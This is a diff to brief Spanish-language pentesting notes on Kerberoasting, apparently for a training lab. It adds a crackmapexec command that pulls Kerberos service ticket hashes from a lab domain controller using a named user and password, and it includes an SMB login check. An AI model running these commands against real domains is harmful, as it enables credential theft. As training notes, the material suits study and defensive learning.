@@ -1,5 +1,4 @@
-Para esto podemos usar el módulo de impacket.
-
+# Impacket
 Debemos utilizarlo contra un DC y necesitamos tener credenciales de un usuario (en texto plano o en NTLM), una shell en contexto de un usuario de dominio o una cuenta de system.
 
 Listar los usuarios con SPN
@@ -22,3 +21,6 @@ y luego podemos probar conectarnos:
     sudo crackmapexec smb <dc_ip> -u <user> -p <pass>
 
 
+# Crackmapexec
+
+    crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out
